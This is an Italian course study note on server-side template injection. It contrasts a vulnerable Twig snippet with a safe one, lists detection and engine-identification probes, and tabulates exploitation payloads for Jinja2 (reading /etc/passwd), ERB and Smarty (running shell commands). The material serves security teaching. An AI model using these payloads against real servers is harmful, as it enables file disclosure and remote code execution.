---
title: Server-Side Template Injection
tags:
  - cyberbootcamp
  - concetto
  - web-security
  - ssti
  - rce
---

# Server-Side Template Injection

> [!summary] In breve
> L'input dell'utente viene inserito nel **testo** del template invece che passato come dato: il template engine lo esegue, spesso fino all'RCE.

```php
$content = "<h3>Hi, $name!</h3>";      // vulnerabile: input nel template
$twig->createTemplate($content)->render();
// sicuro: template fisso "Hi, {{ name }}!" + ['name' => $name]
```

1. **Detection**: fuzzing con `${{<%[%'"}}%\` → errori, `500`.
2. **Identificazione**: `${7*7}`, `{{7*7}}`, poi `{{7*'7'}}` → `49` Twig, `7777777` Jinja2.
3. **Exploitation**:

| Engine | Payload |
|---|---|
| Jinja2 | `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}` |
| ERB | `<%= IO.popen('ls').readlines() %>` |
| Smarty | `` {php} echo `ls`; {/php} `` |

Payload: PayloadsAllTheThings.

## Collegamenti

- **Concetti correlati**: [[Command Injection]] · [[Path Traversal]]
- **Mappa**: [[MOC - CyberBootCamp]]

> [!info] Approfondimento
> - [[01 - CB - Web Insecurity 1#Server-Side Template Injection (SSTI)|Lezione 1 — Server-Side Template Injection (SSTI)]]
> - [[01 - CB - Web Insecurity 1#A template (attackable™)|Lezione 1 — A template (attackable™)]]
> - [[01 - CB - Web Insecurity 1#Template injection: cheatsheet|Lezione 1 — Template injection: cheatsheet]]
> - [[01 - CB - Web Insecurity 1#Template injection: exploitation|Lezione 1 — Template injection: exploitation]]
